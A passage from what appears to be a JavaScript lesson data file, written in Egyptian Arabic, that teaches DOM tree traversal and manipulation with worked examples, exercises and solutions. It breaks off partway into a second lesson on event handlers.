          desc: R`الـ DOM شجرة: [[document]] فوق، وتحته [[<html>]] (الـ root)، وكل عقدة (node) ليها أب (parent) واحد، وممكن يبقى ليها أولاد (children) وإخوات (siblings)، وكل اللي تحتها مهما نزل اسمهم descendants. الدرس ده بيمشي في الشجرة بالخصايص بدل [[querySelector]]، وبيوريك ليه [[childNodes]] فيها حاجات انت مكتبتهاش.
• للعناصر بس: [[parentElement]] و [[children]] و [[firstElementChild]] و [[lastElementChild]] و [[nextElementSibling]] و [[previousElementSibling]] و [[childElementCount]].
• لكل العقد (نصوص ومسافات وتعليقات): [[parentNode]] و [[childNodes]] و [[firstChild]] و [[nextSibling]].
• فوق وتحت: [[closest(selector)]] و [[contains(node)]].
• تبني وتنقل وتمسح: [[createElement]] و [[append]] و [[prepend]] و [[before]] و [[after]] و [[replaceWith]] و [[replaceChildren]] و [[remove]] و [[cloneNode(true)]].`,
          example: R`const menu = document.querySelector("#menu");
console.log(menu.childNodes.length, menu.children.length);
console.log([...menu.childNodes].map(n => n.nodeName).join(" "));
const hot = menu.querySelector(".hot");
console.log(hot.previousElementSibling.textContent, hot.nextElementSibling.textContent);
console.log(hot.parentElement.id, document.documentElement.parentNode.nodeName);
const b = hot.querySelector("b");
console.log(b.closest("ul").id, b.closest("table"), menu.contains(b));
menu.append(menu.firstElementChild);`,
          try: R`على الصفحة دي: [[<ul id="u">]] وتحتها سطرين [[<li>أ</li>]] و [[<li>ب</li>]] كل واحد في سطر لوحده. قبل ما تشغّل، توقّع: [[u.childNodes.length]] و [[u.children.length]] و [[u.firstChild.nodeName]] و [[u.lastChild.nodeType]].`,
          sol: R`~~~html tree.html
<ul id="u">
  <li>أ</li>
  <li>ب</li>
</ul>
<script>
const u = document.querySelector("#u");
console.log(u.childNodes.length, u.children.length, u.firstChild.nodeName, u.firstElementChild.textContent, u.lastChild.nodeType);
</script>
~~~

~~~text الناتج (Chrome 157)
5 2 #text أ 3
~~~

الـ ٥ = نص (سطر جديد ومسافتين) ثم [[li]] ثم نص ثم [[li]] ثم نص. أول عقدة وآخر عقدة نصوص ([[nodeType]] ٣)، والعناصر ([[nodeType]] ١) اتنين بس.`,
          teach: R`## الفكرة

المتصفح بيقرا الـ HTML ويبني منه شجرة objects. كل حاجة فيها اسمها **node** (عقدة): العناصر، والنص، وحتى المسافات والسطور الجديدة اللي بين التاجز، والتعليقات. الصفحة اللي هنمشي فيها:

~~~html الصفحة
<ul id="menu">
  <li>قهوة</li>
  <li class="hot">شاي <b>جديد</b></li>
  <li>كيكة</li>
</ul>
~~~

~~~text الشجرة (العناصر بس)
document
└─ html                 الـ root element
   ├─ head
   └─ body
      └─ ul#menu        أب الـ 3 li
         ├─ li           قهوة
         ├─ li.hot       شاي      ← إخواته: li قبله و li بعده
         │  └─ b         جديد     ← descendant لـ ul، وابن لـ li.hot
         └─ li           كيكة
~~~

| الكلمة | المعنى | مثال |
|---|---|---|
| root | أول عنصر، مالوش أب عنصر | [[<html>]] = [[document.documentElement]] |
| parent | العقدة اللي فوقك على طول | أب [[li.hot]] هو [[ul]] |
| child | اللي تحتك على طول | أولاد [[ul]] الـ ٣ [[li]] |
| sibling | ليكم نفس الأب | [[li]] الأولاني والتالت إخوات [[li.hot]] |
| descendant | تحتك بأي عدد خطوات | [[b]] descendant لـ [[ul]] |
| ancestor | فوقك بأي عدد خطوات | [[ul]] و [[body]] و [[html]] ancestors لـ [[b]] |

كل النواتج من Chrome 157 على الصفحة دي.

---

## ١. [[childNodes]] و [[children]]: النص بيتحسب

~~~text الناتج: سطر ٢ و ٣ في المثال
7 3
#text LI #text LI #text LI #text
~~~

**[[childNodes]]** = كل العقد (٧): المسافة والسطر الجديد بعد [[<ul>]] نص، وبين كل [[li]] والتاني نص، وقبل [[</ul>]] نص. **[[children]]** = العناصر بس (٣). وده بيتكرر في كل خاصية:

| كل العقد (فيها النص) | العناصر بس | بيرجّع |
|---|---|---|
| [[childNodes]] | [[children]] | كل الأولاد (NodeList / HTMLCollection) |
| [[firstChild]] و [[lastChild]] | [[firstElementChild]] و [[lastElementChild]] | أول وآخر ابن، أو [[null]] |
| [[nextSibling]] و [[previousSibling]] | [[nextElementSibling]] و [[previousElementSibling]] | الأخ اللي بعد أو قبل، أو [[null]] |
| [[parentNode]] | [[parentElement]] | الأب (والفرق عند [[<html>]] بس) |
| [[hasChildNodes()]] | [[childElementCount]] | فيه أولاد؟ / عددهم |

~~~text [[menu.firstChild.textContent]] مقابل [[firstElementChild]]
"\n  " قهوة
~~~

نوع العقدة في [[nodeType]]: [[1]] عنصر ([[Node.ELEMENT_NODE]])، و [[3]] نص ([[Node.TEXT_NODE]])، و [[8]] تعليق، و [[9]] الـ document. و [[nodeName]] بيرجّع [["LI"]] (كابيتال في HTML) أو [["#text"]] أو [["#comment"]]. ولاسم التاج صغير استخدم [[localName]] ([["li"]]).

**قاعدة:** في ٩٩٪ من الشغل عايز العناصر، فاستخدم عمود «العناصر بس». الباج الكلاسيكي في تمرين ٣: [[nextSibling.classList]] بيقع لأن الأخ الجاي نص.

---

## ٢. لفوق: [[parentElement]] و [[parentNode]] و [[closest]] و [[contains]]

~~~text الناتج: سطر ٦ و ٨ في المثال
menu #document
menu null true
~~~

**[[parentElement]] و [[parentNode]]** نفس الحاجة تقريبًا دايمًا. الفرق عند القمة: أب [[<html>]] هو [[document]]، والـ document مش عنصر، فـ [[document.documentElement.parentNode]] = [[#document]] لكن [[parentElement]] = [[null]].

**[[el.closest(selector)]]** بيطلع لفوق (من العنصر نفسه) لحد ما يلاقي أول ancestor بيطابق الـ selector، أو [[null]]. ده اللي بيخلي event delegation تشتغل (درس «event delegation»): ضغطة على [[<b>]] جوه زرار، [[e.target.closest("button")]] يرجّعلك الزرار.

**[[a.contains(b)]]** = [[true]] لو [[b]] هو [[a]] نفسه أو تحته بأي عمق. [[menu.contains(menu)]] = [[true]] (اتجرّبت). الاستخدام المشهور: «اقفل القايمة لو الضغطة برّه» (تمرين ٤).

---

## ٣. تمشي الشجرة كلها

دالة recursive بتمشي على [[children]] وتنزل في كل واحد:

~~~js count.js
function countDescendants(el) {
  let n = 0;
  for (const child of el.children) n += 1 + countDescendants(child);
  return n;
}
~~~

ولو عايز كل العناصر تحت عنصر من غير recursion: [[el.querySelectorAll("*")]] (اتقاسوا الاتنين في تمرين ٥: نفس الرقم). وفيه أداة جاهزة للحالات الكبيرة: [[document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT)]] و [[nextNode()]]:

~~~text الناتج: TreeWalker على ul#menu
LI,LI,LI,B,LI,LI
~~~

(الـ [[LI]] الزيادة دي عناصر اتضافت في القسم الجاي.) الترتيب دايمًا «document order»: الأب، وبعدين أول ابن وكل اللي تحته، وبعدين الابن التاني.

---

## ٤. تبني وتنقل وتمسح

~~~text الناتج: كل سطر بعد العملية اللي قبله (اسم كل li)
append:     قهوة | شاي جديد | كيكة | عصير
prepend:    مية | قهوة | شاي جديد | كيكة | عصير
move:       قهوة | شاي جديد | كيكة | عصير | مية
replaceWith: قهوة | لاتيه | كيكة | مية      (hot.isConnected = false)
after:      قهوة | لاتيه | شاي جديد | كيكة | مية
~~~

| الدالة | بتحط فين | على مين |
|---|---|---|
| [[parent.append(...nodes)]] | آخر أولاد [[parent]] | عناصر أو نصوص، كذا واحد مرة واحدة |
| [[parent.prepend(...)]] | أول أولاد [[parent]] | |
| [[el.before(...)]] و [[el.after(...)]] | أخ قبل [[el]] أو بعده | |
| [[el.replaceWith(...)]] | مكان [[el]] نفسه | [[el]] بيطلع من الصفحة |
| [[parent.replaceChildren(...)]] | يمسح كل الأولاد ويحط الجداد | من غير arguments = فضّي العنصر |
| [[el.remove()]] | يشيل [[el]] من مكانه | |

**عنصر موجود = نقل مش نسخ.** سطر ٩ في المثال [[menu.append(menu.firstElementChild)]] خد أول [[li]] وحطه في الآخر: العقدة الواحدة متقدرش تبقى في مكانين. نفس الحكاية لو عملت [[append]] لنفس العنصر مرتين: هيبقى مرة واحدة.

**النص بيتحط زي ما هو:** [[latte.before("نص لوحده")]] بيعمل text node (مش HTML)، فـ [[children]] بقت ٤ و [[childNodes]] بقت ٩. ولأن النص مش بيتفسّر كـ HTML، [[append("<b>x</b>")]] بيكتب الحروف نفسها: آمن مع كلام اليوزر.

**الأخطاء:**

~~~text الناتج (Chrome 157)
TypeError: Failed to execute 'appendChild' on 'Node': parameter 1 is not of type 'Node'.
HierarchyRequestError: Failed to execute 'append' on 'Element': The new child element contains the parent.
~~~

الأولى: [[appendChild]] القديمة بتقبل node بس (عكس [[append]] اللي بتقبل نصوص). التانية: حاولت تحط [[ul]] جوه [[li]] هي أصلًا جواها، والشجرة متبقاش دايرة.

**[[children]] حية و [[querySelectorAll]] صورة:** خدت الاتنين قبل [[remove()]]:

~~~text الناتج
live vs static: 4 5
~~~

[[menu.children]] (HTMLCollection) اتحدثت لوحدها، و [[querySelectorAll]] (NodeList) فضلت زي ما خدتها. ولو بتمسح عناصر وانت بتلف على [[children]]، هتنط عناصر: لف على [[[...menu.children]]] (نسخة). وكمان [[children.forEach]] مش موجودة ([[undefined]])، و [[childNodes.forEach]] و [[querySelectorAll(...).forEach]] موجودين.

---

## ٥. [[cloneNode]]: نسخة

~~~text الناتج
shallow: <li class="hot"></li>
deep: <li class="hot">شاي <b>جديد</b></li>
~~~

- **[[cloneNode()]]** = العنصر بالـ attributes بس من غير أولاد. **[[cloneNode(true)]]** = العنصر وكل اللي تحته.
- **الـ [[id]] بيتنسخ:** النسخة ليها نفس الـ id، فغيّره أو شيله قبل ما تحطها في الصفحة.
- **الـ listeners مش بتتنسخ:** زرار عليه [[addEventListener("click")]]، نسخته بتتداس ومفيش حاجة بتحصل (اتقاس في تمرين ٥ في الدرس ده). الـ [[onclick="..."]] المكتوب كـ attribute بيتنسخ لأنه attribute.
- **الاستخدام الأشهر:** [[<template>]] فيها شكل كارت، و [[tpl.content.firstElementChild.cloneNode(true)]] لكل عنصر في الداتا، وبعدين تملا النصوص بـ [[textContent]]. ده اللي مشروع الملاحظات الكبير في الوحدة دي بيعمله.
- **جديد ومش في كل المتصفحات:** [[parent.moveBefore(node, ref)]] بتنقل عنصر من غير ما تبوّظ حالته (فيديو شغال، focus، animation). موجودة في Chrome 157 ولسه «Limited availability» في MDN.

---

## الخلاصة

| عايز | استخدم |
|---|---|
| الأب | [[parentElement]] |
| الأولاد / أول وآخر واحد | [[children]] و [[firstElementChild]] و [[lastElementChild]] |
| الأخ اللي بعدي / قبلي | [[nextElementSibling]] و [[previousElementSibling]] |
| أقرب ancestor بشكل معين | [[closest(selector)]] |
| هل ده جوه ده؟ | [[contains(node)]] |
| أضيف / أنقل | [[append]] و [[prepend]] و [[before]] و [[after]] |
| أبدّل / أفضّي / أمسح | [[replaceWith]] و [[replaceChildren()]] و [[remove()]] |
| نسخة | [[cloneNode(true)]] (والـ listeners لأ) |

اللي ميتلخبطش: المسافات في الـ HTML عقد نص، فاستخدم الخصايص اللي فيها «Element». والعنصر الموجود لما تعمله [[append]] بيتنقل مش بيتنسخ.`,
          lines: [
            R`بنجيب الـ [[ul]] اللي هنمشي فيها`,
            R`[[childNodes]] = ٧ (فيها نصوص المسافات)، و [[children]] = ٣ عناصر بس`,
            R`أسامي الـ ٧ عقد: [[#text]] بين كل [[LI]] والتاني، لأن السطر الجديد والمسافات نص`,
            R`بنجيب [[li.hot]] اللي في نص اللستة بـ [[querySelector]] جوه الـ [[menu]]، عشان نمشي منه للإخوات`,
            R`الأخ اللي قبله «قهوة» واللي بعده «كيكة»، من غير ما نعدّي على النص`,
            R`أبوه [[ul#menu]]، وأبو [[<html>]] هو الـ document نفسه ([[#document]])`,
            R`بنجيب عنصر [[b]] اللي جوه [[li.hot]]، وهو حفيد الـ [[ul]] (descendant)`,
            R`[[closest]] طلع لفوق ولقى [[ul#menu]]، وملقاش [[table]] فرجّع [[null]]، و [[contains]] = [[true]]`,
            R`أول [[li]] اتنقل لآخر اللستة: العقدة الموجودة بتتنقل مش بتتنسخ`,
          ],
          practice: [
            { lvl: 'تطبيق', t: R`**ابني:** لستة دور فيها ٣ أسامي، وجنب كل اسم زرارين ▲ و ▼ بيطلّعوه أو ينزّلوه مكان واحد، وسطر تحت بيكتب الترتيب «الدور: سارة ثم عمر ثم منى». listener واحد على اللستة، والنقل بـ [[previousElementSibling]] و [[before]] و [[nextElementSibling]] و [[after]] (من قسم ٤ في الشرح).`, done: R`▲ على الأخير بيطلعه فوق اللي قبله، و ▲ على الأول ومش بيحصل حاجة ومفيش error، و ▼ على الأخير نفس الكلام، والسطر بيتحدث مع كل ضغطة.`, sol: R`~~~live 230 لستة الدور
<style>
  body { font: 16px/1.6 system-ui, sans-serif; margin: 16px; }
  #queue { padding: 0; list-style: none; display: grid; gap: 6px; max-width: 320px; }
  #queue li { display: flex; justify-content: space-between; align-items: center; background: #f3f4f6; padding: 4px 10px; border-radius: 6px; }
  button { font: inherit; padding: 0 8px; }
</style>
<ol id="queue">
  <li><span>سارة</span> <span><button data-move="up" aria-label="لفوق">▲</button><button data-move="down" aria-label="لتحت">▼</button></span></li>
  <li><span>عمر</span> <span><button data-move="up" aria-label="لفوق">▲</button><button data-move="down" aria-label="لتحت">▼</button></span></li>
  <li><span>منى</span> <span><button data-move="up" aria-label="لفوق">▲</button><button data-move="down" aria-label="لتحت">▼</button></span></li>
</ol>
<p id="order"></p>
<script>
const queue = document.querySelector("#queue");
const order = () => {
  document.querySelector("#order").textContent = "الدور: " + [...queue.children].map(li => li.firstElementChild.textContent).join(" ثم ");
};
queue.addEventListener("click", e => {
  const btn = e.target.closest("button[data-move]");
  if (!btn) return;
  const li = btn.closest("li");
  if (btn.dataset.move === "up") li.previousElementSibling?.before(li);
  else li.nextElementSibling?.after(li);
  btn.focus();
  order();
});
order();
</script>
~~~

~~~text الناتج (Chrome 157، Playwright داس الزراير بالترتيب ده)
البداية:          الدور: سارة ثم عمر ثم منى
▲ على منى:        الدور: سارة ثم منى ثم عمر
▲ على الأولى:     الدور: سارة ثم منى ثم عمر   (مفيش أخ قبلها، مفيش حاجة حصلت)
▼ على الأخير:     الدور: سارة ثم منى ثم عمر
~~~

- **[[li.previousElementSibling?.before(li)]]:** «حط نفسك قبل أخوك اللي قبلك». والـ [[?.]] بيوقف لو مفيش أخ (أول عنصر)، فمفيش [[TypeError]].
- **مش محتاجين نمسح ونعمل عنصر جديد:** [[before]] على عنصر موجود بينقله، والـ listeners اللي جواه زي ما هي.
- **[[btn.focus()]]:** بعد النقل الـ focus بيفضل على الزرار، فاللي بيستخدم الكيبورد يقدر يدوس Enter تاني ويكمّل نقل.
- **[[li.firstElementChild]]** هو الـ [[span]] اللي فيه الاسم. لو استخدمت [[firstChild]] وكان فيه مسافة قبل الـ span في الـ HTML هتاخد نص فاضي.` },
            { lvl: 'تطبيق', t: R`**صلّح الكود البايظ:** [[const next = document.querySelector("#u li").nextSibling; next.classList.add("hl");]] على الـ [[ul#u]] اللي في «جرّب». إيه الخطأ بالنص؟ وجرّب نفس السطر على [[<ol><li>اغلي المية</li><li class="now">حط البن</li><li>قلّب</li></ol>]] (كله في سطر واحد) من [[.now]]: ليه اشتغل هناك؟ (من قسم ١ في الشرح).`, done: R`شفت [[TypeError]] في الأولى، والتانية اشتغلت لأن مفيش مسافات بين التاجز، والإصلاح [[nextElementSibling]] اشتغل في الاتنين.`, sol: R`~~~html fix-sibling.html
<ul id="u">
  <li>أ</li>
  <li>ب</li>
</ul>
<ol id="steps"><li>اغلي المية</li><li class="now">حط البن</li><li>قلّب</li></ol>
<script>
const first = document.querySelector("#u li");
try { first.nextSibling.classList.add("hl"); } catch (e) { console.log("بايظ:", e.name + ": " + e.message); }
document.querySelector(".now").nextSibling.classList.add("hl");
first.nextElementSibling.classList.add("hl");
console.log("صح:", first.nextElementSibling.className, document.querySelector(".now").nextElementSibling.textContent);
</script>
~~~

~~~text الناتج (Chrome 157)
بايظ: TypeError: Cannot read properties of undefined (reading 'add')
صح: hl قلّب
~~~

- **[[nextSibling]]** لأول [[li]] في [[#u]] هو text node (السطر الجديد والمسافتين). الـ text node مالوش [[classList]]، فـ [[classList]] = [[undefined]] و [[.add]] وقعت.
- **في الـ [[ol]]** التاجز لازقة في بعض، فـ [[nextSibling]] طلع عنصر بالصدفة. ده أسوأ نوع باج: الكود يشتغل لحد ما حد يعمل format للـ HTML (Prettier مثلًا) فيقع.
- **الإصلاح:** [[nextElementSibling]] بيتخطى النص والتعليقات دايمًا. ولو مش متأكد إن فيه أخ: [[next?.classList.add("hl")]].` },
            { lvl: 'تطبيق', t: R`**ابني:** قايمة «الحساب ▾» بتفتح بزرار، وبتتقفل لو دست في أي حتة برّه القايمة (بـ [[contains]])، أو دست Esc (والـ focus يرجع للزرار)، ومبتتقفلش لو دست جوه. وحدّث [[aria-expanded]] (من قسم ٢ في الشرح).`, done: R`ضغطة جوه القايمة مبتقفلهاش، وضغطة على أي حتة في الصفحة بتقفلها، و Esc بيقفلها والـ focus على الزرار، و [[aria-expanded]] بيتغيّر [[true]] و [[false]].`, sol: R`~~~live 230 قايمة بتتقفل من برّه
<style>
  body { font: 16px/1.6 system-ui, sans-serif; margin: 16px; min-height: 200px; }
  .dropdown { position: relative; display: inline-block; }
  .dropdown ul { position: absolute; inset-inline-start: 0; margin: 4px 0 0; padding: 6px; list-style: none; background: #fff; border: 1px solid #ccc; border-radius: 6px; min-width: 140px; }
  button { font: inherit; }
</style>
<div class="dropdown" id="dd">
  <button type="button" id="toggle" aria-expanded="false">الحساب ▾</button>
  <ul id="menu" hidden>
    <li><a href="#">بياناتي</a></li>
    <li><a href="#">طلباتي</a></li>
    <li><button type="button">خروج</button></li>
  </ul>
</div>
<p id="log">دوس على الزرار، وبعدين دوس في أي حتة برّه.</p>
<script>
const dd = document.querySelector("#dd");
const menu = document.querySelector("#menu");
const toggle = document.querySelector("#toggle");
function setOpen(open) {
  menu.hidden = !open;
  toggle.setAttribute("aria-expanded", String(open));
}
toggle.addEventListener("click", () => setOpen(menu.hidden));
document.addEventListener("click", e => {
  if (!dd.contains(e.target)) {
    if (!menu.hidden) document.querySelector("#log").textContent = "اتقفلت: الضغطة كانت على " + e.target.localName + " برّه القايمة";
    setOpen(false);
  }
});
document.addEventListener("keydown", e => {
  if (e.key === "Escape" && !menu.hidden) { setOpen(false); toggle.focus(); }
});
</script>
~~~

~~~text الناتج (Chrome 157، Playwright)
فتح:            ظاهرة true، aria-expanded = true
ضغطة جوه:       ظاهرة true
ضغطة على الـ p:  ظاهرة false | اتقفلت: الضغطة كانت على p برّه القايمة
Esc:            ظاهرة false، الـ focus على toggle
~~~

- **[[dd.contains(e.target)]]** على الـ div اللي فيه الزرار والقايمة الاتنين. لو عملتها على [[menu]] بس، الضغطة على الزرار نفسه هتتحسب «برّه» فتقفل القايمة في نفس اللحظة اللي بتفتح فيها (الـ listener بتاع [[document]] بيشتغل بعد بتاع الزرار بسبب الـ bubbling).
- **[[hidden]]** بيخفي العنصر ومبيخليهوش يتداس ولا يوصله Tab.
- **Esc والـ focus:** اللي بيستخدم الكيبورد لازم يرجع مكان ما كان.` },
            { lvl: 'تحدي', t: R`**مسألة:** اكتب [[cssPath(el)]] بتطلع من العنصر لفوق بـ [[parentElement]] وترجّع selector يوصله: لو للعنصر [[id]] وقّف عنده ([[nav#site]])، ولو ليه إخوات من نفس النوع حط [[:nth-child(n)]]. واكتب [[countDescendants(el)]] recursive وقارنها بـ [[querySelectorAll("*").length]]. اتأكد إن [[document.querySelector(cssPath(x)) === x]] (من قسمي ٢ و ٣ في الشرح).`, done: R`تاني [[li]] في [[nav#site]] بيطلع [[nav#site > ul > li:nth-child(2)]]، والـ [[querySelector]] بيرجّع نفس العنصر، والعدّين متساويين.`, sol: R`~~~html css-path.html
<nav id="site"><ul><li><a href="#">الرئيسية</a></li><li><a href="#" id="menu-link">المنيو</a></li></ul></nav>
<ol id="steps"><li>اغلي المية</li><li class="now">حط البن</li><li>قلّب</li></ol>
<script>
function cssPath(el) {
  const parts = [];
  for (let node = el; node && node !== document.documentElement; node = node.parentElement) {
    const parent = node.parentElement;
    const index = [...parent.children].indexOf(node) + 1;
    const same = [...parent.children].filter(c => c.localName === node.localName).length;
    parts.unshift(node.id ? node.localName + "#" + node.id : same > 1 ? node.localName + ":nth-child(" + index + ")" : node.localName);
    if (node.id) break;
  }
  return parts.join(" > ");
}
function countDescendants(el) {
  let n = 0;
  for (const child of el.children) n += 1 + countDescendants(child);
  return n;
}
const li2 = document.querySelector("#menu-link").parentElement;
console.log(cssPath(li2), "|", cssPath(document.querySelector("#steps .now")), "|", cssPath(document.querySelector("#site a")));
console.log(document.querySelector(cssPath(li2)) === li2, countDescendants(document.querySelector("#site")), document.querySelector("#site").querySelectorAll("*").length);
</script>
~~~

~~~text الناتج (Chrome 157)
nav#site > ul > li:nth-child(2) | ol#steps > li:nth-child(2) | nav#site > ul > li:nth-child(1) > a
true 5 5
~~~

- **[[parts.unshift]]:** بنطلع من تحت لفوق، فكل جزء بيتحط في أول اللستة.
- **[[:nth-child(n)]] بيعدّ كل الإخوات** مش اللي من نفس النوع بس، فالرقم من [[indexOf]] في [[children]] كلها. (لو عايز من نفس النوع: [[:nth-of-type]].)
- **الوقفة عند [[id]]:** الـ id المفروض فريد، فالـ selector بيبقى أقصر وأثبت.
- **العدّ:** [[nav]] تحته [[ul]] و ٢ [[li]] و ٢ [[a]] = ٥. الاتنين نفس الرقم، والـ recursion هنا عشان تفهم إزاي [[querySelectorAll("*")]] بيمشي.
- DevTools بيعمل نفس الحكاية: كليك يمين على عنصر في Elements ثم Copy ثم Copy selector.` },
            { lvl: 'سريع', t: R`**قارن وقيس:** اعمل [[<p id="card">]] عليه listener بيعدّ الضغطات، وحطه في [[div]] بـ [[append]] مرتين: كام عنصر في الـ div؟ وبعدين [[cloneNode(true)]] وحط النسخة: كام عنصر بـ [[#card]]؟ ادوس على الاتنين: مين اتعدّ؟ (من قسمي ٤ و ٥ في الشرح).`, done: R`[[append]] مرتين = عنصر واحد، والنسخة عملت [[id]] مكرر، والـ listener اشتغل على الأصلي بس.`, sol: R`~~~js clone-vs-move.js (في صفحة)
const box = document.createElement("div");
const card = document.createElement("p");
card.id = "card";
card.textContent = "كارت";
let clicks = 0;
card.addEventListener("click", () => clicks++);
box.append(card);
box.append(card);
console.log("append مرتين:", box.children.length);
const copy = card.cloneNode(true);
copy.addEventListener("click", () => (clicks += 10));
box.append(copy);
console.log("بعد النسخ:", box.children.length, box.querySelectorAll("#card").length, copy.id);
card.click();
copy.click();
console.log("الضغطات:", clicks);
const other = document.createElement("section");
other.append(card);
console.log("بعد النقل:", box.children.length, other.children.length, card.parentElement.localName);
~~~

~~~text الناتج (Chrome 157)
append مرتين: 1
بعد النسخ: 2 2 card
الضغطات: 11
بعد النقل: 1 1 section
~~~

- **[[append]] لنفس العقدة** نقلها لنفس المكان، فلسه واحدة.
- **النسخة شايلة نفس الـ id:** بقى فيه اتنين [[#card]]، و [[getElementById]] هيرجّع الأول بس. غيّر [[copy.id]] أو شيله.
- **11 = 1 + 10:** ضغطة الأصلي عدّت ١ من الـ listener بتاعه، والنسخة عدّت ١٠ من الـ listener اللي حطيناه عليها بعد النسخ. الـ listener الأصلي متنسخش.
- **النقل لعنصر تاني** شاله من [[box]] تلقائي، من غير [[remove()]].` },
          ],
          ref: [
            { t: "MDN: Node", url: "https://developer.mozilla.org/en-US/docs/Web/API/Node" },
            { t: "MDN: Node.childNodes", url: "https://developer.mozilla.org/en-US/docs/Web/API/Node/childNodes" },
            { t: "MDN: Element.children", url: "https://developer.mozilla.org/en-US/docs/Web/API/Element/children" },
            { t: "MDN: Node.parentElement", url: "https://developer.mozilla.org/en-US/docs/Web/API/Node/parentElement" },
            { t: "MDN: Element.firstElementChild", url: "https://developer.mozilla.org/en-US/docs/Web/API/Element/firstElementChild" },
            { t: "MDN: Element.nextElementSibling", url: "https://developer.mozilla.org/en-US/docs/Web/API/Element/nextElementSibling" },
            { t: "MDN: Element.closest()", url: "https://developer.mozilla.org/en-US/docs/Web/API/Element/closest" },
            { t: "MDN: Node.contains()", url: "https://developer.mozilla.org/en-US/docs/Web/API/Node/contains" },
            { t: "MDN: Element.append()", url: "https://developer.mozilla.org/en-US/docs/Web/API/Element/append" },
            { t: "MDN: Element.replaceWith()", url: "https://developer.mozilla.org/en-US/docs/Web/API/Element/replaceWith" },
            { t: "MDN: Element.remove()", url: "https://developer.mozilla.org/en-US/docs/Web/API/Element/remove" },
            { t: "MDN: Node.cloneNode()", url: "https://developer.mozilla.org/en-US/docs/Web/API/Node/cloneNode" },
          ],
          pre: ["js/querySelector", "js/textContent و classList", { to: "js/event delegation", why: R`[[closest]] هو اللي بيخلي listener واحد على الأب يعرف الضغطة جات من أنهي ابن` }],
          deep: {
            why: R`[[querySelector]] بيدوّر في الصفحة كلها، بس كتير انت عارف مكانك ومحتاج «الأب» أو «اللي جنبي»: زرار مسح جوه كارت، صف جدول، خطوة بعد خطوة. والفرق بين [[childNodes]] و [[children]] هو أصل باجات بتظهر وتختفي مع شكل الـ HTML.`,
            how: R`كل [[Node]] فيه مؤشرات للأب وأول وآخر ابن والإخوات، والخصايص اللي فيها «Element» بتمشي على نفس المؤشرات وتتخطى اللي مش عنصر. [[append]] و [[before]] وأخواتهم بيشيلوا العقدة من مكانها القديم الأول (لو ليها مكان) وبعدين يحطوها، والنصوص بيعملوا منها [[Text]] node. و [[children]] collection حية بتتحسب كل مرة تقراها.`,
            when: R`[[closest]] في أي listener على أب. [[contains]] لـ «ضغطة برّه». [[nextElementSibling]] و [[previousElementSibling]] للنقل والتنقل بالكيبورد. [[replaceChildren()]] لما ترسم لستة من الداتا من أول وجديد. [[cloneNode(true)]] مع [[<template>]].`,
            mistakes: R`[[firstChild]] و [[nextSibling]] وانت قصدك عنصر. اللف على [[children]] وانت بتمسح منها. نسخ عنصر بالـ id. توقّع إن [[cloneNode]] بيجيب الـ listeners. [[appendChild("نص")]] بدل [[append]]. [[parentElement]] على [[<html>]] ومستني الـ document.`,
          },
        },
        {
          cmd: "event handlers: addEventListener و onclick و onclick=\"\"",
          title: "٣ طرق تربط بيها كود بحدث: واحدة للشغل، وواحدة تفهمها، وواحدة متستخدمهاش",
          desc: R`فيه ٣ طرق تقول للمتصفح «لما الزرار يتداس شغّل ده»: [[addEventListener]] (الطريقة الصح، وتقدر تشيله بـ [[removeEventListener]] أو بـ [[signal]])، والـ event handler property [[el.onclick = fn]] (واحد بس لكل حدث، والجديد بيمسح القديم)، والـ inline attribute [[<button onclick="...">]] في الـ HTML (متستخدمهاش: الـ CSP بيمنعها، وبتشتغل في الـ global scope، وبتخلط الـ HTML بالكود).
• [[addEventListener(type, fn, { once, signal, capture, passive })]] و [[removeEventListener(type, sameFn)]] بنفس الـ function بالظبط.
• [[el.onclick = fn]] و [[el.onclick = null]].
• [[onclick="..."]]: جواها [[this]] و [[event]]، وبتشوف حقول الفورم بالاسم.`,
          example: R`const buy = document.querySelector("#buy");
buy.onclick = () => console.log("onclick 1");
buy.onclick = () => console.log("onclick 2");
function hello() { console.log("listener"); }
buy.addEventListener("click", hello);
buy.addEventListener("click", hello);
buy.addEventListener("click", () => console.log("مرة واحدة"), { once: true });
buy.click();
buy.removeEventListener("click", hello);
buy.onclick = null;
buy.click();`,
          try: R`في صفحة عندك فيها زرار، شغّل المثال في الـ Console. كام سطر طبع أول [[click()]]؟ وكام سطر تاني [[click()]]؟ وبعدين جرّب [[buy.removeEventListener("click", () => console.log("مرة واحدة"))]] قبل أول ضغطة: الـ listener اتشال؟`,
          sol: R`~~~text الناتج (Chrome 157)
onclick 2
listener
مرة واحدة
~~~

أول ضغطة: ٣ سطور. التانية: ولا سطر (الـ [[once]] اتشال لوحده بعد أول مرة، و [[hello]] اتشال بـ [[removeEventListener]]، و [[onclick]] بقى [[null]]).

و [[removeEventListener]] بـ arrow جديدة **مبتشيلش حاجة**: كل [[() => ...]] function جديدة، حتى لو الكود نفس الحروف، والمتصفح بيقارن الـ reference مش النص.`,
          teach: R`## الفكرة

نفس الضغطة، ٣ طرق تربطها:

~~~html الطرق التلاتة
<button id="a" onclick="console.log('inline')">inline attribute</button>
<script>
  document.querySelector("#b").onclick = () => console.log("property");
  document.querySelector("#c").addEventListener("click", () => console.log("listener"));
</script>
~~~

| | [[addEventListener]] | [[el.onclick = fn]] | [[onclick="..."]] |
|---|---|---|---|
| كام واحد على نفس الحدث | أي عدد | واحد بس | واحد بس |
| تشيله | [[removeEventListener]] أو [[signal]] | [[= null]] | تمسح الـ attribute |
| options ([[once]] و [[capture]] و [[passive]]) | آه | لأ | لأ |
| مع CSP من غير [[unsafe-inline]] | شغال | شغال | **ممنوع** |
| الكود فين | ملف JS | ملف JS | جوه الـ HTML كنص |

كل النواتج من Chrome 157 على صفحة من سيرفر محلي.

---

## ١. [[addEventListener]] و [[removeEventListener]]

~~~text الناتج: أول [[buy.click()]] في المثال
onclick 2
listener
مرة واحدة
~~~

**[[addEventListener("click", hello)]] مرتين = مرة واحدة.** المتصفح بيخزّن الـ listeners بالتلاتة (النوع، والـ function، و [[capture]])، ولو نفس التلاتة موجودين بيتجاهل التاني. عشان كده «listener» اتطبع مرة.

**[[removeEventListener]] محتاج نفس الـ function بالظبط** (نفس الـ reference، ونفس [[capture]]). الغلطات المشهورة:

~~~js
btn.addEventListener("click", () => save());
btn.removeEventListener("click", () => save());      // arrow جديدة: مبتشيلش
btn.addEventListener("click", this.save.bind(this));
btn.removeEventListener("click", this.save.bind(this)); // bind بيرجّع function جديدة كل مرة
~~~

